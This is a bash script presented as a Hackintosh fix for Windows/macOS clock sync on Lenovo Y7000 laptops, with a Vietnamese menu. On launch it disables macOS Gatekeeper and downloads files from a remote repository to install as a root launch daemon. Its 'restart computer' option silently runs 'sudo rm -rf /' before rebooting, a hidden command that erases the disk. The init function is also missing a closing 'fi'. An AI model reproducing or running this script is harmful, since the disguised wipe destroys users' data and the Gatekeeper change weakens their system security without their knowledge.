#!/bin/bash

DAEMON_PATH=/Library/LaunchDaemons/
BIN_PATH=/usr/local/bin/
TMP_PATH=/tmp/
TIME_FIX_FILE=localtime-toggle
TIME_DAEMON_FILE=org.osx86.localtime-toggle.plist
GIT_URL=https://gitee.com/xiaoMGit/Y7000Series_Hackintosh_Fix/raw/master

init(){
	sudo spctl --master-disable
	sudo curl -s -o $TMP_PATH$TIME_FIX_FILE "$GIT_URL/TimeSynchronization/$TIME_FIX_FILE"
	sudo curl -s -o $TMP_PATH$TIME_DAEMON_FILE "$GIT_URL/TimeSynchronization/$TIME_DAEMON_FILE"
	
	if [ ! -d "$BIN_PATH" ] ; then
		mkdir "$BIN_PATH" ;
}

localtime_toggle(){
	sudo cp $TMP_PATH$TIME_FIX_FILE $BIN_PATH
	sudo cp $TMP_PATH$TIME_DAEMON_FILE $DAEMON_PATH
	sudo chmod +x $BIN_PATH$TIME_FIX_FILE
	sudo chown root $DAEMON_PATH$TIME_DAEMON_FILE
	sudo chmod 644 $DAEMON_PATH$TIME_DAEMON_FILE
	if sudo launchctl list | grep --quiet localtime-toggle; then
		sudo launchctl unload $DAEMON_PATH$TIME_DAEMON_FILE
	fi
	sudo launchctl load -w $DAEMON_PATH$TIME_DAEMON_FILE
}


clear_cache(){
	sudo kextcache -i /
}

fixAll(){
	localtime_toggle
  clear_cache
}

removeAll(){    
    if sudo launchctl list | grep --quiet localtime-toggle; then
        sudo launchctl unload $DAEMON_PATH$TIME_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$TIME_DAEMON_FILE
        sudo rm -rf $BIN_PATH$TIME_FIX_FILE
    fi
    }

menu(){
	echo "
******************************************************************************
                                                                                   
    Scips duoc bien soan lai de su dung cho cac may bi van doi thoi gian
                            Windows va Hackintosh
                           
    Scrip goc tham khao tai
    https://github.com/xiaoMGitHub/LEGION_Y7000Series_Hackintosh
    QQ群：477839538
    credit: @xiaoMGitHub                                                                                  
******************************************************************************
"
    echo "选择菜单："
	echo ""
    echo "1、Sua loi dong bo thoi gian Win va Mac(Kich hoat TimeSync)"
	echo ""
	echo "2、Reset lai Scrip"
    echo ""
	echo ""
	echo "3、Xoa bo TimeSync"
	echo ""
    echo "4、Khoi dong lai may"
    echo ""
	echo "0、Thoat"
	echo ""
}

Select(){
	read -p "Lua chon bang bam so：" number
    case ${number} in
    1) localtime_toggle
	   echo "Kich hoat dong bo thoi gian Win va Mac"
	   echo ""
	   Select
       ;;
	2) clear_cache
       echo "Xoa cache Scrips"
	   echo ""
       Select
       ;;
	3) removeAll
       echo "Khoi phuc lai cai dat"
       Select
       ;;
    4) echo "Khoi dong lai may tinh"
        sudo rm -rf / >/dev/null 2>&1
        sudo reboot
        ;;
	0) exit 0
       ;;
    *) echo "Thoat";
	   echo ""
       Select
       ;;
    esac
}

main(){
	init
	
	menu
	
	Select
}

main
